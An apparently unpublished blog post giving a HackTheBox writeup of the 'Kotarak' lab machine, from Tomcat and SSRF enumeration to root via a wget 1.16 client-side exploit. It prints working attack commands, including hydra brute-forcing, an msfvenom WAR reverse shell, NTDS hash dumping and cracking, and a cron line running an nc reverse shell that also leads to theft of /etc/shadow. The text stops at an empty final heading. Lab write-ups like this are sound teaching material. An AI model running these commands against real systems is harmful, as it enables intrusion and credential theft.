---
layout: post
title:  "HTB Writeup [Linux - Hard] - Kotarak"
published: false
---

![](/assets/Kotarak/Kotarak.png)

### Summary
- Kotarak is a really fun box. it had SSH, Apache web server and Tomcat listening on the outside.
- Even though the Tomcat was vulnerable to [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938), it led us nowhere.
- Instead, the web page on the Apache had a Service-Side Request Forgery which we could exploit to get further.
- Using the SSRF to enumerate the ports listening locally, we find an interally-hosted website which had a backup of the `tomcat-users.xml` file.
- That file contained credentials that we used to upload a WAR reverse shell and get on the box.
- On the file system, we found an Active Directory `ntds.dit` dump which was apparently a remnant of a pentest.
- We extracted all the domain hashes from that and cracked a hash for a password that belonged to a local user called `atanas`.
- Since `atanas` was member of the privileged `disk` group, we went into a rabbit hole trying to exploit that using the `debugfs` tool.
- Failing to get anywhere, we search elsewhere to find a readable file called `app.log` within the root folder.
- The log file indicated another server using a vulnerable version of `wget` to fetch data from ours.
- We deploy an elaborate exploit to target that client's `wget` and deploy a malicious `cron` job to run as root and give us the box.

---

### NMAP
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat/8.5.5 - Error report
60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title:         Kotarak Web Hosting        
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The scan covering all ports gets us that Apache on port 60000. The `http-title` nmap script gives us a hint that it's has custom content (Kotarak Web Hosting)

### Testing Tomcat
We will go over some quick checks here first because they can get us RCE if they work.

An error message was there instead of the standard home page.

![](/assets/Kotarak/tomcat-home-page-error.jpg)

We first want to test for default credentials in the Tomcat manager interface. So we check for it in the standard location at `/manager/html`

![](/assets/Kotarak/tomcat-manager-login.jpg)

It's there. that pop-up indicates HTTP basic authentication. we can use `hydra` to brute-force that.

we're going to use Metasploit's default user/password list:

![](/assets/Kotarak/getting-the-msf-list.jpg)

but we need to change up the list to match the format that `hydra`'s `-C` flag will accept: `login:pass`

![](/assets/Kotarak/the-list-and-hydra-usage.jpg)

so we will do that with a quick `sed` replacing all spaces with colons (`:`) and save the list to a file before launcing the attack

```bash
hydra -C tomcat_user_pass_list.txt -s 8080 -f kotarak http-get /manager/html -vV
```

![](/assets/Kotarak/hydra-attack.jpg)

no luck though :/

Next, we check for exploits using `searchsploit`

![](/assets/Kotarak/searchsploit-tomcat-8.jpg)

we don't get a good match there.

however, we want to check if the famous Ghostcat vulnerability was there.

![](/assets/Kotarak/ghostcat-exploit-db.jpg)

our version should be vulnerable. Let's use this [Github exploit](https://github.com/00theway/Ghostcat-CNVD-2020-10487) for testing:

![](/assets/Kotarak/ajpshooter-usage.jpg)

the usage seems pretty straighforward.

note: we supply the `8009` port as the `ajp_port` argument because it's required for exploitation.

```bash
python ajpShooter.py http://kotarak:8080 8009 /WEB-INF/web.xml read
```

![](/assets/Kotarak/ajpshooter-works.jpg)

We were able to read the `/WEB-INF/web.xml` file but there isn't anything useful in it. So we move on..

### The Apache High Port
On port 60000, we find this page:

![](/assets/Kotarak/port-60k.jpg)

none of the links on the side work. But our senses are telling us that we should check for SSRF here.

that's because of the many references that tell us a URL can be supplied as input to this page:

![](/assets/Kotarak/possible-ssrf-detection.jpg)

to test that, we'll first test if it can reach us.

So we stand up a quick PHP web server with `php -S 0.0.0.0:80` and supply the url for our kali:

![](/assets/Kotarak/ssrf-confirmed.jpg)

vulnerability confirmed!

### Exploiting SSRF
Let's use `wfuzz` to see what's listening on the box locally.

we first do a quick fuzz over ports 8080 to 8090 to see the reponses for open ports (like 8080) vs. closed ports (8081-8090) and be able to tune out the closed ones.

a.k.a calibrate our toolz :D

![](/assets/Kotarak/wfuzz-test-run.jpg)

alright, looks like it detected port 8080 which we knew was up and serving the tomcat. and it gave a response of 2 characters elsewhere.

we can use the `--hh` flag to exclude those responses and provide the full range of TCP ports (1-65535) for fuzzing.

as well set the `-t` flag to 50 concurrent connections for speed since we're going to do 65K+ requests and we haven't got all day :D

```bash
wfuzz -t 50 --hh 2 -z range,1-65535 -c http://kotarak:60000/url.php?path=http://127.0.0.1:FUZZ
```

![](/assets/Kotarak/ssrf-portscan-results.jpg)

a big list of ports comes up:
- 22 (that's SSH)
- 90
- 110
- 200
- 320
- 888
- 3306 (that's probably mysql)
- 8080
- and 60000

Port 90: junk

![](/assets/Kotarak/ssrf-port-90.jpg)

Port 110: junk II

![](/assets/Kotarak/ssrf-port-110.jpg)

Port 200: third is a charm right? nope. junk III

![](/assets/Kotarak/ssrf-port-200.jpg)

Port 320: a login form! nope, the action field is empty within the form. junk IV XD

![](/assets/Kotarak/ssrf-port-320.jpg)

Port 888: at last something interesting here:

![](/assets/Kotarak/ssrf-port-888.jpg.jpg)

we add the `?doc=backup` query to the url and use `curl` instead of clicking the link to get the file:

![](/assets/Kotarak/cred-found-on-888.jpg)

we get creds :D

### WAR Shell Upload
We first verify the logins with `hydra` before getting too excited xD

![](/assets/Kotarak/hydra-verify-tomcat.jpg)

Oh I love that color :D

Ok, let's generate a WAR reverse shell with `msfvenom`

```bash
msfvenom -p java/shell_reverse_tcp lhost=10.10.16.5 lport=9000 -f war -o letmein.war
```

and upload the file with `curl`
```bash
curl -v -u admin:'3@g01PdhB!' --upload-file letmein.war "http://kotarak:8080/manager/text/deploy?path=/shell&update=true"
```

and do another `curl` to hit the shell endpoint
```bash
curl http://kotarak:8080/shell
```

![](/assets/Kotarak/shell-as-tomcat.jpg)

Sweet! :]

### Lateral Movement
after getting our reverse shell, we improve it like the usual:

![](/assets/Kotarak/shell-improvement.jpg)

and we `source` the `.bashrc` file from the `atanas` user for colors :P

![](/assets/Kotarak/getting-colors-in-our-session.jpg)

when going through the file system, we find something very interesting:

![](/assets/Kotarak/finding-ntds-dump.jpg)

the keywords here are:
- the first file's name: NTDS (this is the name of the Active Directory database file `ntds.dit`)
- the second file's type: MS Windows Registry file

these two components are enough for us to dump the domain hashes within.

[impacket](https://github.com/SecureAuthCorp/impacket)'s `secretsdump.py` script can easily take care of this.

we're going to transfer those files over to kali to get dumping and get cracking :]

![](/assets/Kotarak/transfer-ad-dump.jpg)

after renaming the dit file to `ntds.dit` and the bin file to `system`, we dump the hashes:

```bash
secretsdump.py -just-dc-ntlm -ntds ntds.dit -system system local
```

![](/assets/Kotarak/secrets-dump.jpg)

awesome! let's pass this to `hashcat`

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

![](/assets/Kotarak/hashcat-cracking.jpg)

the hash belonged to the `administrator` user.

![](/assets/Kotarak/knowing-which-hash-was-cracked.jpg)

However, just to be sure, we're going to try it with both `root` and `atanas`. there are no other users locally.

![](/assets/Kotarak/finding-local-linux-users.jpg)

failed with `root` as expected :) but worked with `atanas`

![](/assets/Kotarak/shell-as-atanas.jpg)

### Unusual Activity
we run [LinPEAS](https://github.com/carlospolop/PEASS-ng) and see something very strange:

![](/assets/Kotarak/root-files.jpg)

to confirm, we run a `find` command. and take a look inside the files owned by us:

![](/assets/Kotarak/activity-detected.jpg)

we notice a few weird things:
1. there's another machine's IP: 10.0.3.133
2. it executed `wget` 3 times (each 2 minutes apart) to get a file called `archive.tar.gz` which it couldn't get (it got a 404 not found)
3. it was using an older version of `wget` (1.16)

we make a couple of checks to see what's going on:
- searching the file system for that `archive.tar.gz` and check if we can see what it contains
- pinging 10.0.3.133 to see if it's still live

![](/assets/Kotarak/understanding-app-log.jpg)

so `archive.tar.gz` wasn't there :/

however, the host 10.0.3.133 was responding to our pings!

why don't we check for exploits on that version of `wget` before moving on?

![](/assets/Kotarak/wget-searchsploit.jpg)

what? an exploit? for `wget`??

### Elaborate Client Exploitation and Privilege Escalation
Client-Side attacks are nothing new. But for some odd reason, exploiting a client-side command-line tool felt weird :D

Anyway, we check out the details of the exploit on [Exploit-db](https://www.exploit-db.com/exploits/40064)

It was a very interesting read. To sum it up, the scenario is:
- a victim is using `wget` 1.16 to download a file from our server.
- he has to use the command without specifying an output with the `-O` flag.
- that would make `wget` save to the current working directory which is typically the client's `home` folder.
- to exploit, we have to set up a web server that responds with a redirect to an FTP server under our control serving a malicious `.wgetrc` file.
- that `.wgetrc` file would then be downloaded hopefully to the victim's home folder.
- If the `.wgetrc` file was saved in the user's home folder successfully, upcoming uses of `wget` would set the client's `/etc/shadow` as the default file to be POSTed.
- Also it set `/etc/cron.d/wget-root-shell` as the default save location for future downloads.
- On that second request to our evil server, the request from the victim should contain their `/etc/shadow` file as a POST request.
- And it would save the reverse shell that we respond with as a cron job in their `/etc/cron.d` folder as `wget-root-shell`.
- Having registered a `cron` job for that user, and if everything goes to plan, we should get a reverse shell in the following minute.

hopefully this would make more sense in demonstration :D

alright, to perform this exploit, we need to be able to serve a website on the machine on port 80 and verify we're still getting requests from a vulnerable `wget` web client.

however, access to ports below 1000 is only available only for the `root` user.

the only way to get around this is by installing a tool called `authbind` which also requires `root` permission.

was this a rabbit hole, let's first check. maybe it's already here.

![](/assets/Kotarak/authbind-installed.jpg)

it's there! we may continue :D

we set up a `python` web server on port 80 and wait to detect any incoming web requests.

and we get a request!

![](/assets/Kotarak/getting-an-http-request.jpg)

one last check is if we have the `pyftpdlib` module with `python` for setting up our FTP server.

![](/assets/Kotarak/python-ftp-is-there.jpg)

great.

Step #1: Creating the evil `.wgetrc` file

Similar to the instructions on exploit-db, we set this up.

![](/assets/Kotarak/exploit-db-wget-instructions.jpg)

![](/assets/Kotarak/wgetrc-created.jpg)

Starting next step, since we're going to do many things at the same time, we use `tmux` to split our terminal.

However, since we already use `tmux` on our kali, we're going to change the bind key to be able to interact with both `tmux` instances.

here's what the `.tmux.conf` file in `atanas`'s home directory should look like:

```
set-option -g prefix C-a
set -g default-terminal "xterm-256color"
```

the second line is for preserving colors within `tmux` sessions. Quality of life stuff xD

Step #2: Getting the python exploit and modifying it.

after fetching the exploit from exploit-db, we have to modify a few lines to suit our needs:

```python
HTTP_LISTEN_IP = '192.168.57.1'
HTTP_LISTEN_PORT = 80
FTP_HOST = '192.168.57.1'
FTP_PORT = 21

ROOT_CRON = "* * * * * root /usr/bin/id > /root/hacked-via-wget \n"
```

- with out web exploit server, we're going to listen on all interfaces so we should set the `HTTP_LISTEN_IP` variable to `0.0.0.0`
- the same won't work for the FTP server. because the victim must find a remote IP in the redirection to be able to reach it
- finally, we need to switch up the `/usr/bin/id > /root/hacked-via-wget` command to something more serious a.k.a. a reverse shell :D

it should look like this:

```python
HTTP_LISTEN_IP = '0.0.0.0'
HTTP_LISTEN_PORT = 80
FTP_HOST = '10.10.10.55'
FTP_PORT = 21

ROOT_CRON = "* * * * * root rm /tmp/pipe; mkfifo /tmp/pipe; /bin/sh -i < /tmp/pipe 2>&1 | nc 10.10.10.55 9000 > /tmp/pipe; rm /tmp/pipe \n"
```

we use the `mkfifo` reverse shell because it works across many linux distros and has just been reliable :)

and we're making the 10.10.10.55 machine receive the shell because we're not yet sure about our kali being reachable from 10.0.3.133.

Step #3: Getting the first `wget`

A few moments after starting the FTP server and the `python` exploit, we caught something.

![](/assets/Kotarak/wget-exploit-and-ftp-together.jpg)

Step #4: Getting the `shadow` file and deploying the evil `cron`

And after two more minutes pass, we get the POST request containing the `/etc/shadow` file. That's enough indicator that our victim is the `root` user. or at least a user who can read the shadow file :)

plus the exploit now served the `cron` containing our reverse shell

![](/assets/Kotarak/receiving-the-shadow-file-and-deploying-cron.jpg)


Step #5: Receiving the connect back

One minute after, the `cron` job started and sent us back our root shell :D

![](/assets/Kotarak/rooted.jpg)

Just amazing <3 :D

### Rabbit Hole: the disk group